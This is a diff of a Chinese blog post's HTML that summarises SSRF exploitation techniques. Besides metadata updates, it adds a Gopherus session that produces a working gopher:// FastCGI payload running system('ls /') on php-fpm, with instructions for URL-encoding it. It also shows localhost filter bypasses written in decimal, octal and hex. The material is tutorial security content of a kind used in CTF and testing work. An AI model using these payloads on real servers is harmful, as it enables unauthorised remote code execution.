@@ -29,7 +29,7 @@
 <meta property="og:image" content="https://www.dr0n.top/img/summary/ssrf-2.png">
 <meta property="og:image" content="https://www.dr0n.top/img/summary/ssrf-3.png">
 <meta property="article:published_time" content="2023-02-05T04:00:00.000Z">
-<meta property="article:modified_time" content="2024-03-21T10:37:40.106Z">
+<meta property="article:modified_time" content="2024-07-17T05:39:43.842Z">
 <meta property="article:author" content="dr0n">
 <meta property="article:tag" content="总结">
 <meta property="article:tag" content="ssrf">
@@ -254,7 +254,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.9k 字
+          4k 字
         
       </span>
     
@@ -265,7 +265,7 @@
         
         
         
-          30 分钟
+          41 分钟
         
       </span>
     
@@ -336,9 +336,12 @@
 
 <h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>攻击内网<code>Redis</code>，<code>FastCGI</code>，<code>MySql</code>等服务</p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5665">浅析Redis中SSRF的利用</a></p>
-<p>利用<a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">Gopherus</a>工具</p>
+<p>通常会利用<a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">Gopherus</a>等工具</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">MySQL (Port-3306)<br>PostgreSQL(Port-5432)<br>FastCGI (Port-9000)<br>Memcached (Port-11211)<br>    If stored data is getting De-serialized by:<br>        Python<br>        Ruby<br>        PHP<br>Redis (Port-6379)<br>Zabbix (Port-10050)<br>SMTP (Port-25)<br></code></pre></td></tr></table></figure>
 
+<h2 id="ssrf打php-fpm"><a href="#ssrf打php-fpm" class="headerlink" title="ssrf打php-fpm"></a>ssrf打php-fpm</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@lewiserii:~/Gopherus-master<span class="hljs-comment"># python2 gopherus.py --exploit fastcgi</span><br><br><br>  ________              .__<br> /  _____/  ____ ______ |  |__   ___________ __ __  ______<br>/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/<br>\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \<br> \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;<br>        \/       |__|        \/     \/                 \/<br><br>                author: $_SpyD3r_$<br><br>Give one file name <span class="hljs-built_in">which</span> should be surely present <span class="hljs-keyword">in</span> the server (prefer .php file)<br><span class="hljs-keyword">if</span> you don<span class="hljs-string">&#x27;t know press ENTER we have default one:  index.php</span><br><span class="hljs-string">Terminal command to run:  ls /</span><br><span class="hljs-string"></span><br><span class="hljs-string">Your gopher link is ready to do SSRF:</span><br><span class="hljs-string"></span><br><span class="hljs-string">gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH56%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%008%04%00%3C%3Fphp%20system%28%27ls%20/%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></code></pre></td></tr></table></figure>
+
+<p>传入时记得将生成的payload下划线后面的数据进行url编码</p>
 <h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><h2 id="ip限制"><a href="#ip限制" class="headerlink" title="ip限制"></a>ip限制</h2><p>例如限制了<code>127/172</code></p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">进制转换<br>10进制 http://2130706433<br>8进制 http://017700000001<br>16进制  http://0x7F000001<br><br>长度限制<br>host&lt;5<br>url=http://0/flag.php<br>url=http://127.1/flag.php<br><br>host&lt;3<br>url=http://0/flag.php  //在window下代表0.0.0.0，而在liunx下代表127.0.0.1<br></code></pre></td></tr></table></figure>
 
